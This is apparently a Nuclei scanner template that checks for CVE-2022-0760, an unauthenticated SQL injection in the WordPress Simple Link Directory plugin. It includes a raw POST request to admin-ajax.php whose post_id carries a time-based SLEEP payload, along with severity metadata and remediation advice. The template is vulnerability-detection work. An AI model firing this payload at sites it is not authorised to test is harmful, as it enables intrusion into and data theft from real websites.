http:
- matchers:
  - condition: and
    dsl:
    - duration>=7
    - status_code == 200 || status_code == 500
    - contains(content_type, "text/html")
    - contains(body, "vote_status") || contains(body, "critical error")
    type: dsl
  raw:
  - '@timeout 20s

    POST /wp-admin/admin-ajax.php HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    action=qcopd_upvote_action&post_id=(SELECT 3 FROM (SELECT SLEEP(7))enz)

    '
id: CVE-2022-0760
info:
  author: theamanrawat
  classification:
    cpe: cpe:2.3:a:quantumcloud:simple_link_directory:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2022-0760
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.89602
    epss-score: 0.02788
  description: 'WordPress Simple Link Directory plugin before 7.7.2 contains a SQL
    injection vulnerability. The plugin does not validate and escape the post_id parameter
    before using it in a SQL statement via the qcopd_upvote_action AJAX action, available
    to unauthenticated and authenticated users. An attacker can possibly obtain sensitive
    information, modify data, and/or execute unauthorized administrative operations
    in the context of the affected site.

    '
  impact: 'Successful exploitation of this vulnerability could lead to unauthorized
    access, data leakage, and potential compromise of the WordPress site.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: simple_link_directory
    vendor: quantumcloud
    verified: true
  name: WordPress Simple Link Directory <7.7.2 - SQL injection
  reference:
  - https://wpscan.com/vulnerability/1c83ed73-ef02-45c0-a9ab-68a3468d2210
  - https://wordpress.org/plugins/simple-link-directory/
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0760
  - https://plugins.trac.wordpress.org/changeset/2684915
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Update to the latest version of WordPress Simple Link Directory plugin
    (7.7.2 or higher) to mitigate the SQL injection vulnerability.

    '
  severity: critical
  tags: cve,cve2022,sqli,wordpress,wp-plugin,wp,simple-link-directory,unauth,wpscan,quantumcloud
